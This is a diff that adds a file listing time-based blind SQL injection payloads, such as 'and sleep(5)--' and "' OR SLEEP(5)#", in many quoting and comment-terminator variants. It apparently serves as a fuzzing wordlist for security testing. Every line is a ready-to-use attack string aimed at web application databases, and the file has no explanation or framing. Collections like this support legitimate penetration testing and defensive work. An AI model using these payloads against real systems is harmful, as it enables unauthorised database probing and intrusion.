@@ -1,0 +1,45 @@
+1 and sleep 5--
+1 and sleep 5
+1 and sleep(5)--
+1 and sleep(5)
+' and sleep 5--
+' and sleep 5
+' and sleep 5 and '1'='1
+' and sleep(5) and '1'='1
+' and sleep(5)--
+' and sleep(5)
+' AnD SLEEP(5) ANd '1
+and sleep 5--
+and sleep 5
+and sleep(5)--
+and sleep(5)
+and SELECT SLEEP(5); #
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+ and sleep 5--
+ and sleep 5
+ and sleep(5)--
+ and sleep(5)
+ and SELECT SLEEP(5); #
+' AND SLEEP(5)#
+" AND SLEEP(5)#
+') AND SLEEP(5)#
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+ or sleep 5--
+ or sleep 5
+ or sleep(5)--
+ or sleep(5)
+ or SELECT SLEEP(5); #
+' OR SLEEP(5)#
+" OR SLEEP(5)#
+') OR SLEEP(5)#
